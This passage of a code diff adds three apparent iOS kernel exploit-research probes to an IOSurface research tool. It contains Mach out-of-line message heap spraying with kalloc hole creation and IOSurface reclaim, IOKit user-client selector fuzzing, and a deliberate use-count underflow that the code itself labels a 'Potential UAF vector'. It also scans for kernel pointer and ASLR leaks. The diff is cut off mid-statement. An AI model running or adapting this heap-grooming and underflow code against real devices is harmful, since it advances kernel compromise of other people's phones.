@@ -20187,3 +20187,786 @@ void iosurface_research_pipe_krw(ISRLogBlock log, ISRDoneBlock done) {
         done(res);
     });
 }
+
+#pragma mark - Round 30: Strategy Pivot
+
+// Probe 91: Mach OOL Message Spray
+void iosurface_research_ool_spray(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        ISRSymbols sym;
+        if (!isr_load(&sym)) {
+            log(@"OOLSPRAY: Failed to load symbols");
+            done(@{@"status": @"ERROR", @"anomalies": @0});
+            return;
+        }
+        log(@"OOLSPRAY: === Probe 91: Mach OOL Message Spray ===");
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+
+        int anomalies = 0;
+        int portsCreated = 0;
+        int messagesSent = 0;
+        int portsFreed = 0;
+        int reclaimDetected = 0;
+        int dataLeaks = 0;
+        int writesConfirmed = 0;
+
+        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+        SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+        typedef CFTypeRef (*GetValueFn)(IOSurfaceRef, CFStringRef);
+        GetValueFn getValue = (GetValueFn)dlsym(sym.iosurface, "IOSurfaceGetValue");
+
+        // Step 1: Create mach ports and send OOL messages
+        #define OOL_PORT_COUNT 1024
+        #define OOL_DATA_SIZE 256
+        mach_port_t oolPorts[OOL_PORT_COUNT];
+        memset(oolPorts, 0, sizeof(oolPorts));
+
+        log(@"OOLSPRAY: Step 1 — Creating 1024 mach ports with OOL messages");
+
+        // Prepare sentinel data
+        uint8_t sentinel[OOL_DATA_SIZE];
+        for (int i = 0; i < OOL_DATA_SIZE; i += 8) {
+            sentinel[i]   = 0x41; sentinel[i+1] = 0x41;
+            sentinel[i+2] = 0x41; sentinel[i+3] = 0x41;
+            sentinel[i+4] = 0x42; sentinel[i+5] = 0x42;
+            sentinel[i+6] = 0x42; sentinel[i+7] = 0x42;
+        }
+
+        if (!isr_stopped()) {
+            for (int i = 0; i < OOL_PORT_COUNT && !isr_stopped(); i++) {
+                kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &oolPorts[i]);
+                if (kr == KERN_SUCCESS) {
+                    portsCreated++;
+
+                    // Insert send right
+                    mach_port_insert_right(mach_task_self(), oolPorts[i], oolPorts[i], MACH_MSG_TYPE_MAKE_SEND);
+
+                    // Build OOL message
+                    struct {
+                        mach_msg_header_t header;
+                        mach_msg_body_t body;
+                        mach_msg_ool_descriptor_t ool;
+                    } msg;
+                    memset(&msg, 0, sizeof(msg));
+
+                    msg.header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+                    msg.header.msgh_size = sizeof(msg);
+                    msg.header.msgh_remote_port = oolPorts[i];
+                    msg.header.msgh_local_port = MACH_PORT_NULL;
+                    msg.header.msgh_id = 0x41414141;
+
+                    msg.body.msgh_descriptor_count = 1;
+
+                    msg.ool.address = sentinel;
+                    msg.ool.size = OOL_DATA_SIZE;
+                    msg.ool.deallocate = 0;
+                    msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                    msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                    kr = mach_msg(&msg.header,
+                                  MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                  sizeof(msg), 0, MACH_PORT_NULL,
+                                  100, MACH_PORT_NULL);
+                    if (kr == KERN_SUCCESS) {
+                        messagesSent++;
+                    }
+                }
+            }
+            log([NSString stringWithFormat:@"OOLSPRAY: Created %d ports, sent %d OOL messages", portsCreated, messagesSent]);
+        }
+
+        // Step 2: Free half the ports to create holes in kalloc
+        if (!isr_stopped()) {
+            log(@"OOLSPRAY: Step 2 — Freeing 512 ports to create kalloc holes");
+            for (int i = 0; i < OOL_PORT_COUNT; i += 2) {
+                if (oolPorts[i] != MACH_PORT_NULL) {
+                    mach_port_deallocate(mach_task_self(), oolPorts[i]);
+                    mach_port_mod_refs(mach_task_self(), oolPorts[i], MACH_PORT_RIGHT_RECEIVE, -1);
+                    oolPorts[i] = MACH_PORT_NULL;
+                    portsFreed++;
+                }
+            }
+            log([NSString stringWithFormat:@"OOLSPRAY: Freed %d ports", portsFreed]);
+        }
+
+        // Step 3: Create IOSurfaces to reclaim freed kalloc slots
+        #define RECLAIM_SURF_COUNT 256
+        IOSurfaceRef reclaimSurfs[RECLAIM_SURF_COUNT];
+        memset(reclaimSurfs, 0, sizeof(reclaimSurfs));
+
+        if (!isr_stopped()) {
+            log(@"OOLSPRAY: Step 3 — Spraying 256 IOSurfaces with property data to reclaim kalloc holes");
+
+            NSDictionary *props = @{
+                @"IOSurfaceWidth":  @64,
+                @"IOSurfaceHeight": @64,
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfacePixelFormat": @0x42475241,
+            };
+
+            for (int i = 0; i < RECLAIM_SURF_COUNT && !isr_stopped(); i++) {
+                reclaimSurfs[i] = sym.create((__bridge CFDictionaryRef)props);
+                if (reclaimSurfs[i] && setValue) {
+                    // Set properties with specific patterns to detect reclaim
+                    NSString *key = [NSString stringWithFormat:@"OOLReclaim_%d", i];
+                    NSData *pattern = [NSData dataWithBytes:sentinel length:OOL_DATA_SIZE];
+                    setValue(reclaimSurfs[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)pattern);
+                }
+            }
+
+            log([NSString stringWithFormat:@"OOLSPRAY: Sprayed %d reclaim surfaces", RECLAIM_SURF_COUNT]);
+        }
+
+        // Step 4: Read remaining OOL messages to check for cross-contamination
+        if (!isr_stopped()) {
+            log(@"OOLSPRAY: Step 4 — Reading remaining OOL messages for cross-contamination");
+
+            for (int i = 1; i < OOL_PORT_COUNT && !isr_stopped(); i += 2) {
+                if (oolPorts[i] == MACH_PORT_NULL) continue;
+
+                struct {
+                    mach_msg_header_t header;
+                    mach_msg_body_t body;
+                    mach_msg_ool_descriptor_t ool;
+                    mach_msg_trailer_t trailer;
+                } recv;
+                memset(&recv, 0, sizeof(recv));
+
+                kern_return_t kr = mach_msg(&recv.header,
+                                            MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                                            0, sizeof(recv), oolPorts[i],
+                                            100, MACH_PORT_NULL);
+                if (kr == KERN_SUCCESS && recv.body.msgh_descriptor_count == 1) {
+                    uint8_t *oolData = (uint8_t *)recv.ool.address;
+                    vm_size_t oolSize = recv.ool.size;
+
+                    if (oolData && oolSize >= OOL_DATA_SIZE) {
+                        // Check if data changed (cross-contamination from IOSurface reclaim)
+                        int differences = 0;
+                        for (vm_size_t b = 0; b < oolSize && b < OOL_DATA_SIZE; b++) {
+                            if (oolData[b] != sentinel[b]) differences++;
+                        }
+                        if (differences > 0) {
+                            reclaimDetected++;
+                            anomalies += 3;
+                            log([NSString stringWithFormat:@"OOLSPRAY: CROSS-CONTAMINATION at port[%d]: %d bytes differ!", i, differences]);
+
+                            // Check if it looks like kernel data
+                            for (vm_size_t b = 0; b + 7 < oolSize; b += 8) {
+                                uint64_t val = *(uint64_t *)(oolData + b);
+                                if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                    (val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                    dataLeaks++;
+                                    anomalies += 5;
+                                    log([NSString stringWithFormat:@"OOLSPRAY: KERNEL PTR LEAK at port[%d]+%zu: 0x%llx", i, (size_t)b, val]);
+                                }
+                            }
+                        }
+
+                        // Deallocate OOL data
+                        vm_deallocate(mach_task_self(), (vm_address_t)oolData, oolSize);
+                    }
+                }
+            }
+
+            log([NSString stringWithFormat:@"OOLSPRAY: Cross-contamination=%d, kernel leaks=%d", reclaimDetected, dataLeaks]);
+        }
+
+        // Step 5: Try writing via IOSurfaceSetValue and reading back via OOL
+        if (!isr_stopped() && setValue && getValue) {
+            log(@"OOLSPRAY: Step 5 — Attempting write via IOSurface property to corrupt OOL");
+
+            for (int i = 0; i < RECLAIM_SURF_COUNT && !isr_stopped(); i++) {
+                if (!reclaimSurfs[i]) continue;
+                // Write a distinctive pattern
+                uint8_t writePattern[OOL_DATA_SIZE];
+                memset(writePattern, 0xCC, OOL_DATA_SIZE);
+                writePattern[0] = 0xDE; writePattern[1] = 0xAD;
+                writePattern[2] = 0xBE; writePattern[3] = 0xEF;
+
+                NSData *writeData = [NSData dataWithBytes:writePattern length:OOL_DATA_SIZE];
+                for (int k = 0; k < 10; k++) {
+                    NSString *key = [NSString stringWithFormat:@"OOLWrite_%d_%d", i, k];
+                    setValue(reclaimSurfs[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)writeData);
+                }
+
+                // Read back from adjacent OOL port
+                int adjIdx = (i * 2 + 1 < OOL_PORT_COUNT) ? i * 2 + 1 : -1;
+                if (adjIdx >= 0 && oolPorts[adjIdx] != MACH_PORT_NULL) {
+                    CFTypeRef readBack = getValue(reclaimSurfs[i], (__bridge CFStringRef)[NSString stringWithFormat:@"OOLWrite_%d_0", i]);
+                    if (readBack && CFGetTypeID(readBack) == CFDataGetTypeID()) {
+                        CFDataRef dataRef = (CFDataRef)readBack;
+                        if (CFDataGetLength(dataRef) != OOL_DATA_SIZE) {
+                            writesConfirmed++;
+                            anomalies += 5;
+                            log([NSString stringWithFormat:@"OOLSPRAY: WRITE SIZE ANOMALY at surf[%d]: expected=%d got=%ld",
+                                 i, OOL_DATA_SIZE, CFDataGetLength(dataRef)]);
+                        }
+                    }
+                }
+            }
+        }
+
+        // Cleanup
+        for (int i = 0; i < OOL_PORT_COUNT; i++) {
+            if (oolPorts[i] != MACH_PORT_NULL) {
+                mach_port_deallocate(mach_task_self(), oolPorts[i]);
+                mach_port_mod_refs(mach_task_self(), oolPorts[i], MACH_PORT_RIGHT_RECEIVE, -1);
+            }
+        }
+        for (int i = 0; i < RECLAIM_SURF_COUNT; i++) {
+            if (reclaimSurfs[i]) CFRelease(reclaimSurfs[i]);
+        }
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"OOLSPRAY: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"OOLSPRAY: ports=%d msgs=%d freed=%d reclaims=%d leaks=%d writes=%d anomalies=%d",
+             portsCreated, messagesSent, portsFreed, reclaimDetected, dataLeaks, writesConfirmed, anomalies]);
+
+        NSString *verdict;
+        if (writesConfirmed > 0 && dataLeaks > 0) verdict = @"CRITICAL — OOL cross-contamination + kernel ptr leak + write anomaly!";
+        else if (dataLeaks > 0) verdict = @"CRITICAL — kernel pointers leaked via OOL cross-contamination!";
+        else if (reclaimDetected > 0) verdict = @"HIGH — OOL data cross-contaminated by IOSurface reclaim!";
+        else if (writesConfirmed > 0) verdict = @"MEDIUM — write anomaly detected in property storage";
+        else verdict = @"LOW — no cross-contamination detected (zone isolation effective)";
+        log([NSString stringWithFormat:@"OOLSPRAY: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"portsCreated": @(portsCreated),
+            @"messagesSent": @(messagesSent),
+            @"portsFreed": @(portsFreed),
+            @"reclaimDetected": @(reclaimDetected),
+            @"dataLeaks": @(dataLeaks),
+            @"writesConfirmed": @(writesConfirmed)
+        };
+        isr_checkpoint(@"ISR-OOLSpray-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+// Probe 92: IOKit External Method Fuzzing
+void iosurface_research_ioconn_call(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        ISRSymbols sym;
+        if (!isr_load(&sym)) {
+            log(@"IOCONNCALL: Failed to load symbols");
+            done(@{@"status": @"ERROR", @"anomalies": @0});
+            return;
+        }
+        log(@"IOCONNCALL: === Probe 92: IOKit External Method Fuzzing ===");
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+
+        int anomalies = 0;
+        int selectorsTested = 0;
+        int successes = 0;
+        int failures = 0;
+        int unexpectedOutputs = 0;
+        int potentialVulns = 0;
+
+        // Step 1: Open IOSurface user client
+        log(@"IOCONNCALL: Step 1 — Opening IOSurfaceRoot user client");
+
+        io_connect_t connect = 0;
+        io_service_t service = 0;
+
+        if (!isr_stopped()) {
+            CFMutableDictionaryRef matchDict = sym.matching("IOSurfaceRoot");
+            if (matchDict) {
+                service = sym.getMatch(0, matchDict); // 0 = kIOMasterPortDefault
+                if (service) {
+                    kern_return_t kr = sym.open(service, mach_task_self(), 0, &connect);
+                    log([NSString stringWithFormat:@"IOCONNCALL: IOServiceOpen result: 0x%x, connect=%u", kr, connect]);
+                    if (kr != KERN_SUCCESS) connect = 0;
+                } else {
+                    log(@"IOCONNCALL: IOSurfaceRoot service not found");
+                }
+            }
+        }
+
+        // Step 2: Fuzz selectors 0-33 with various input patterns
+        if (!isr_stopped() && connect) {
+            log(@"IOCONNCALL: Step 2 — Fuzzing selectors 0-33");
+
+            uint8_t structBuf[65536];
+            memset(structBuf, 0x41, sizeof(structBuf));
+            // Embed IOSurface-like magic values
+            *(uint32_t *)(structBuf + 0) = 0x494F5346; // "IOSF"
+            *(uint64_t *)(structBuf + 8) = 0xDEADBEEFCAFEBABE;
+
+            size_t testSizes[] = {0, 8, 64, 256, 1024, 4096, 65536};
+            int numSizes = sizeof(testSizes) / sizeof(testSizes[0]);
+
+            for (uint32_t sel = 0; sel <= 33 && !isr_stopped(); sel++) {
+                for (int szIdx = 0; szIdx < numSizes && !isr_stopped(); szIdx++) {
+                    selectorsTested++;
+
+                    uint64_t scalarOut[16];
+                    uint32_t scalarOutCnt = 16;
+                    uint8_t structOut[4096];
+                    size_t structOutSize = sizeof(structOut);
+                    memset(scalarOut, 0, sizeof(scalarOut));
+                    memset(structOut, 0, sizeof(structOut));
+
+                    // Scalar inputs: surface ID = 1, various values
+                    uint64_t scalarIn[6] = {1, 0, 0, 0, 0, 0};
+                    uint32_t scalarInCnt = 1;
+
+                    // Special crafted inputs for known selectors
+                    if (sel == 9 || sel == 10) {
+                        // s_increment/decrement_use_count
+                        scalarIn[0] = 1; // surface ID
+                        scalarInCnt = 1;
+                    } else if (sel == 6) {
+                        // s_set_value — use more scalars
+                        scalarInCnt = 2;
+                        scalarIn[1] = 0xFFFFFFFF;
+                    }
+
+                    kern_return_t kr = sym.call(connect, sel,
+                                                scalarIn, scalarInCnt,
+                                                testSizes[szIdx] > 0 ? structBuf : NULL,
+                                                testSizes[szIdx],
+                                                scalarOut, &scalarOutCnt,
+                                                structOut, &structOutSize);
+
+                    if (kr == KERN_SUCCESS) {
+                        successes++;
+                        // Check for unexpected output data
+                        if (scalarOutCnt > 0) {
+                            for (uint32_t i = 0; i < scalarOutCnt; i++) {
+                                if ((scalarOut[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                    (scalarOut[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                    unexpectedOutputs++;
+                                    anomalies += 10;
+                                    log([NSString stringWithFormat:@"IOCONNCALL: KERNEL PTR in scalar output! sel=%u size=%zu out[%u]=0x%llx",
+                                         sel, testSizes[szIdx], i, scalarOut[i]]);
+                                }
+                            }
+                        }
+                        if (structOutSize > 0 && structOutSize != sizeof(structOut)) {
+                            // Scan struct output for kernel pointers
+                            for (size_t b = 0; b + 7 < structOutSize; b += 8) {
+                                uint64_t val = *(uint64_t *)(structOut + b);
+                                if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                    (val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                    unexpectedOutputs++;
+                                    anomalies += 10;
+                                    log([NSString stringWithFormat:@"IOCONNCALL: KERNEL PTR in struct output! sel=%u size=%zu offset=%zu val=0x%llx",
+                                         sel, testSizes[szIdx], b, val]);
+                                }
+                            }
+                        }
+
+                        if (testSizes[szIdx] >= 4096) {
+                            potentialVulns++;
+                            anomalies += 3;
+                            log([NSString stringWithFormat:@"IOCONNCALL: LARGE INPUT ACCEPTED sel=%u size=%zu scalarOut=%u structOut=%zu",
+                                 sel, testSizes[szIdx], scalarOutCnt, structOutSize]);
+                        }
+                    } else {
+                        failures++;
+                    }
+                }
+            }
+
+            log([NSString stringWithFormat:@"IOCONNCALL: Tested %d, success=%d fail=%d unexpected=%d vulns=%d",
+                 selectorsTested, successes, failures, unexpectedOutputs, potentialVulns]);
+        }
+
+        // Step 3: Special exploitation of use-count selectors (9/10)
+        if (!isr_stopped() && connect) {
+            log(@"IOCONNCALL: Step 3 — Use-count manipulation (selectors 9/10)");
+
+            // Create a surface first
+            NSDictionary *props = @{
+                @"IOSurfaceWidth":  @32,
+                @"IOSurfaceHeight": @32,
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfacePixelFormat": @0x42475241,
+            };
+            IOSurfaceRef testSurf = sym.create((__bridge CFDictionaryRef)props);
+            if (testSurf) {
+                IOSurfaceID surfID = sym.getID(testSurf);
+
+                // Increment use count many times
+                int incSucc = 0;
+                for (int i = 0; i < 100 && !isr_stopped(); i++) {
+                    uint64_t scIn = surfID;
+                    kern_return_t kr = sym.call(connect, 9, &scIn, 1, NULL, 0, NULL, NULL, NULL, NULL);
+                    if (kr == KERN_SUCCESS) incSucc++;
+                }
+                log([NSString stringWithFormat:@"IOCONNCALL: increment_use_count x100: %d succeeded", incSucc]);
+
+                // Decrement use count many more times to try underflow
+                int decSucc = 0;
+                for (int i = 0; i < 150 && !isr_stopped(); i++) {
+                    uint64_t scIn = surfID;
+                    kern_return_t kr = sym.call(connect, 10, &scIn, 1, NULL, 0, NULL, NULL, NULL, NULL);
+                    if (kr == KERN_SUCCESS) decSucc++;
+                    else break; // Stop if kernel rejects
+                }
+                log([NSString stringWithFormat:@"IOCONNCALL: decrement_use_count x150: %d succeeded", decSucc]);
+
+                if (decSucc > incSucc) {
+                    anomalies += 10;
+                    potentialVulns++;
+                    log(@"IOCONNCALL: USE COUNT UNDERFLOW — more decrements than increments succeeded!");
+                }
+
+                // Check if surface is still valid
+                IOSurfaceRef lookback = sym.lookup(surfID);
+                if (!lookback) {
+                    anomalies += 15;
+                    potentialVulns++;
+                    log(@"IOCONNCALL: SURFACE DESTROYED via use-count underflow! Potential UAF vector!");
+                } else {
+                    log(@"IOCONNCALL: Surface still valid after use-count manipulation");
+                }
+
+                CFRelease(testSurf);
+            }
+        }
+
+        // Step 4: High selector fuzzing (34-99)
+        if (!isr_stopped() && connect) {
+            log(@"IOCONNCALL: Step 4 — High selector fuzzing (34-99)");
+            int highSucc = 0;
+            for (uint32_t sel = 34; sel < 100 && !isr_stopped(); sel++) {
+                uint64_t scOut[4];
+                uint32_t scOutCnt = 4;
+                uint8_t stOut[256];
+                size_t stOutSize = sizeof(stOut);
+
+                kern_return_t kr = sym.call(connect, sel,
+                                            NULL, 0, NULL, 0,
+                                            scOut, &scOutCnt,
+                                            stOut, &stOutSize);
+                if (kr == KERN_SUCCESS) {
+                    highSucc++;
+                    selectorsTested++;
+                    successes++;
+                    anomalies += 5;
+                    log([NSString stringWithFormat:@"IOCONNCALL: HIGH SELECTOR %u ACCEPTED! scalarOut=%u structOut=%zu",
+                         sel, scOutCnt, stOutSize]);
+                }
+            }
+            if (highSucc > 0) {
+                log([NSString stringWithFormat:@"IOCONNCALL: %d high selectors accepted — potential undocumented methods!", highSucc]);
+            }
+        }
+
+        // Cleanup
+        if (connect) sym.close(connect);
+        if (service) sym.release(service);
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"IOCONNCALL: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"IOCONNCALL: tested=%d success=%d fail=%d unexpected=%d vulns=%d anomalies=%d",
+             selectorsTested, successes, failures, unexpectedOutputs, potentialVulns, anomalies]);
+
+        NSString *verdict;
+        if (unexpectedOutputs > 5) verdict = @"CRITICAL — kernel pointers leaked via IOConnectCallMethod!";
+        else if (potentialVulns > 3) verdict = @"HIGH — multiple potential vulnerabilities found in user client!";
+        else if (unexpectedOutputs > 0) verdict = @"HIGH — kernel data exposed in selector outputs!";
+        else if (potentialVulns > 0) verdict = @"MEDIUM — suspicious selector behavior detected";
+        else if (successes > 20) verdict = @"MEDIUM — many selectors accept input, attack surface available";
+        else verdict = @"LOW — selectors well-validated";
+        log([NSString stringWithFormat:@"IOCONNCALL: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"selectorsTested": @(selectorsTested),
+            @"successes": @(successes),
+            @"failures": @(failures),
+            @"unexpectedOutputs": @(unexpectedOutputs),
+            @"potentialVulns": @(potentialVulns)
+        };
+        isr_checkpoint(@"ISR-IOConnCall-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+// Probe 93: Task Port Self-Inspection + Kernel Info Harvest
+void iosurface_research_task_intro(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        ISRSymbols sym;
+        if (!isr_load(&sym)) {
+            log(@"TASKINTRO: Failed to load symbols");
+            done(@{@"status": @"ERROR", @"anomalies": @0});
+            return;
+        }
+        log(@"TASKINTRO: === Probe 93: Task Port Self-Inspection ===");
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+
+        int anomalies = 0;
+        int regionsFound = 0;
+        int sharedRegions = 0;
+        int commpageDataPts = 0;
+        int totalInfoHarvested = 0;
+        uint64_t kernelVersion = 0;
+
+        // Step 1: TASK_DYLD_INFO
+        if (!isr_stopped()) {
+            log(@"TASKINTRO: Step 1 — task_info TASK_DYLD_INFO");
+
+            struct task_dyld_info dyldInfo;
+            mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
+            kern_return_t kr = task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&dyldInfo, &count);
+            if (kr == KERN_SUCCESS) {
+                totalInfoHarvested++;
+                log([NSString stringWithFormat:@"TASKINTRO: dyld_all_image_infos=0x%llx", dyldInfo.all_image_info_addr]);
+                log([NSString stringWithFormat:@"TASKINTRO: dyld_all_image_infos_size=%llu", dyldInfo.all_image_info_size]);
+                log([NSString stringWithFormat:@"TASKINTRO: dyld_all_image_infos_format=%d", dyldInfo.all_image_info_format]);
+
+                if (dyldInfo.all_image_info_addr > 0x100000000ULL) {
+                    anomalies++;
+                    log(@"TASKINTRO: High dyld address — possible ASLR data");
+                }
+            }
+        }
+
+        // Step 2: TASK_VM_INFO
+        if (!isr_stopped()) {
+            log(@"TASKINTRO: Step 2 — task_info TASK_VM_INFO");
+
+            task_vm_info_data_t vmInfo;
+            mach_msg_type_number_t count = TASK_VM_INFO_COUNT;
+            kern_return_t kr = task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)&vmInfo, &count);
+            if (kr == KERN_SUCCESS) {
+                totalInfoHarvested++;
+                log([NSString stringWithFormat:@"TASKINTRO: virtual_size=%llu", vmInfo.virtual_size]);
+                log([NSString stringWithFormat:@"TASKINTRO: resident_size=%llu", vmInfo.resident_size]);
+                log([NSString stringWithFormat:@"TASKINTRO: page_size=%d", vmInfo.page_size]);
+                log([NSString stringWithFormat:@"TASKINTRO: phys_footprint=%llu", vmInfo.phys_footprint]);
+                log([NSString stringWithFormat:@"TASKINTRO: min_address=0x%llx", vmInfo.min_address]);
+                log([NSString stringWithFormat:@"TASKINTRO: max_address=0x%llx", vmInfo.max_address]);
+            }
+        }
+
+        // Step 3: Thread state harvest
+        if (!isr_stopped()) {
+            log(@"TASKINTRO: Step 3 — Thread state harvest");
+
+            thread_act_array_t threads;
+            mach_msg_type_number_t threadCount;
+            kern_return_t kr = task_threads(mach_task_self(), &threads, &threadCount);
+            if (kr == KERN_SUCCESS) {
+                log([NSString stringWithFormat:@"TASKINTRO: Found %u threads", threadCount]);
+                totalInfoHarvested++;
+
+                for (mach_msg_type_number_t t = 0; t < threadCount && t < 8 && !isr_stopped(); t++) {
+#ifdef __arm64__
+                    arm_thread_state64_t state;
+                    mach_msg_type_number_t stateCnt = ARM_THREAD_STATE64_COUNT;
+                    kr = thread_get_state(threads[t], ARM_THREAD_STATE64, (thread_state_t)&state, &stateCnt);
+                    if (kr == KERN_SUCCESS) {
+                        uint64_t pc = arm_thread_state64_get_pc(state);
+                        uint64_t sp = arm_thread_state64_get_sp(state);
+                        uint64_t lr = arm_thread_state64_get_lr(state);
+                        log([NSString stringWithFormat:@"TASKINTRO: Thread[%u] PC=0x%llx SP=0x%llx LR=0x%llx", t, pc, sp, lr]);
+                        totalInfoHarvested++;
+
+                        // Check for unusual PC values
+                        if (pc > 0xFFFF000000000000ULL) {
+                            anomalies += 10;
+                            log([NSString stringWithFormat:@"TASKINTRO: KERNEL PC DETECTED on thread %u! 0x%llx", t, pc]);
+                        }
+                    }
+#endif
+                }
+
+                // Deallocate thread ports
+                for (mach_msg_type_number_t t = 0; t < threadCount; t++) {
+                    mach_port_deallocate(mach_task_self(), threads[t]);
+                }
+                vm_deallocate(mach_task_self(), (vm_address_t)threads, threadCount * sizeof(thread_act_t));
+            }
+        }
+
+        // Step 4: Full VM region enumeration
+        if (!isr_stopped()) {
+            log(@"TASKINTRO: Step 4 — VM region enumeration");
+
+            vm_address_t addr = 0;
+            int maxRegions = 2000;
+            int submapCount = 0;
+            int rwxRegions = 0;
+
+            while (addr < 0x7FFFFFFFFFFF && regionsFound < maxRegions && !isr_stopped()) {
+                vm_size_t size = 0;
+                natural_t depth = 0;
+                struct vm_region_submap_info_64 info;
+                mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
+
+                kern_return_t kr = vm_region_recurse_64(mach_task_self(), &addr, &size, &depth,
+                                                        (vm_region_info_t)&info, &count);
+                if (kr != KERN_SUCCESS) break;
+
+                regionsFound++;
+
+                if (info.is_submap) {
+                    submapCount++;
+                    sharedRegions++;
+                }
+
+                // Detect RWX regions
+                if ((info.protection & VM_PROT_ALL) == VM_PROT_ALL) {
+                    rwxRegions++;
+                    anomalies += 3;
+                    log([NSString stringWithFormat:@"TASKINTRO: RWX REGION at 0x%lx size=0x%lx!", (unsigned long)addr, (unsigned long)size]);
+                }
+
+                // Detect shared memory from kernel
+                if (info.share_mode == SM_SHARED || info.share_mode == SM_TRUESHARED) {
+                    sharedRegions++;
+                    if (regionsFound <= 20 || info.share_mode == SM_TRUESHARED) {
+                        log([NSString stringWithFormat:@"TASKINTRO: SHARED at 0x%lx size=0x%lx mode=%d",
+                             (unsigned long)addr, (unsigned long)size, info.share_mode]);
+                    }
+                }
+
+                addr += size;
+                if (addr == 0) break; // overflow
+            }
+
+            log([NSString stringWithFormat:@"TASKINTRO: Enumerated %d regions, %d shared, %d submaps, %d RWX",
+                 regionsFound, sharedRegions, submapCount, rwxRegions]);
+            totalInfoHarvested++;
+        }
+
+        // Step 5: Commpage probe
+        if (!isr_stopped()) {
+            log(@"TASKINTRO: Step 5 — Commpage probe");
+
+            // ARM64 commpage is at 0x0000000FFFFFC000 or similar
+            vm_address_t commpageAddrs[] = {
+                0x0000000FFFFFC000ULL,
+                0xFFFFFC000ULL,
+                0x7FFFFFE00000ULL,
+            };
+
+            for (int c = 0; c < 3 && !isr_stopped(); c++) {
+                vm_address_t cpAddr = commpageAddrs[c];
+                uint8_t buf[4096];
+                vm_size_t readSize = 4096;
+                vm_size_t bytesRead = 0;
+
+                kern_return_t kr = vm_read_overwrite(mach_task_self(), cpAddr, readSize,
+                                                     (vm_address_t)buf, &bytesRead);
+                if (kr == KERN_SUCCESS && bytesRead > 0) {
+                    commpageDataPts++;
+                    anomalies += 2;
+                    log([NSString stringWithFormat:@"TASKINTRO: COMMPAGE READABLE at 0x%lx! Read %lu bytes",
+                         (unsigned long)cpAddr, (unsigned long)bytesRead]);
+
+                    // Scan for interesting data
+                    int nonZero = 0;
+                    for (vm_size_t i = 0; i < bytesRead; i++) {
+                        if (buf[i] != 0) nonZero++;
+                    }
+                    log([NSString stringWithFormat:@"TASKINTRO: Commpage has %d non-zero bytes of %lu",
+                         nonZero, (unsigned long)bytesRead]);
+
+                    // Check for version strings
+                    for (vm_size_t i = 0; i + 7 < bytesRead; i += 8) {
+                        uint64_t val = *(uint64_t *)(buf + i);
+                        if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                            (val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                            anomalies += 5;
+                            log([NSString stringWithFormat:@"TASKINTRO: KERNEL PTR IN COMMPAGE offset=0x%zx val=0x%llx", (size_t)i, val]);
+                            totalInfoHarvested++;
+                        }
+                    }
+
+                    totalInfoHarvested++;
+                }
+            }
+        }
+
+        // Step 6: host_info
+        if (!isr_stopped()) {
+            log(@"TASKINTRO: Step 6 — host_info harvest");
+
+            host_basic_info_data_t hostInfo;
+            mach_msg_type_number_t count = HOST_BASIC_INFO_COUNT;
+            kern_return_t kr = host_info(mach_host_self(), HOST_BASIC_INFO, (host_info_t)&hostInfo, &count);
+            if (kr == KERN_SUCCESS) {
+                totalInfoHarvested++;
+                log([NSString stringWithFormat:@"TASKINTRO: max_cpus=%d avail_cpus=%d memory_size=%llu cpu_type=%d cpu_subtype=%d",
